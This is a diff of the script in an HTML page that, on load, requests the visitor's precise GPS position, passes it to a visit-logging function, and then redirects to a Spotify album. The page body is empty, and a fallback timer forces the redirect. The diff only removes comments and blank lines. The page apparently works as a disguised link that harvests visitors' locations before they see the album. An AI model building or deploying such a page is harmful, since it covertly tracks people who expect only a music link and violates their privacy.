@@ -60,11 +60,6 @@ async function logVisit(data) {
 function redirectToSpotify() {
   window.location.replace(SPOTIFY_ALBUM_URL);
 }
-
-// ==========================================
-// GPS SUCCESS
-// ==========================================
-
 function gpsSuccess(position) {
 
   logVisit({
@@ -76,26 +71,13 @@ function gpsSuccess(position) {
 
   setTimeout(redirectToSpotify, 300);
 }
-
-// ==========================================
-// GPS ERROR
-// ==========================================
-
 function gpsError() {
-
   logVisit({
     page: "album"
   });
-
   setTimeout(redirectToSpotify, 300);
 }
-
-// ==========================================
-// START IMMEDIATELY
-// ==========================================
-
 document.addEventListener("DOMContentLoaded", () => {
-
   navigator.geolocation.getCurrentPosition(
     gpsSuccess,
     gpsError,
@@ -105,15 +87,9 @@ document.addEventListener("DOMContentLoaded", () => {
       maximumAge: 0
     }
   );
-
-  // fallback safety
   setTimeout(redirectToSpotify, 6000);
-
 });
-
 </script>
-
 </head>
-
 <body></body>
 </html>
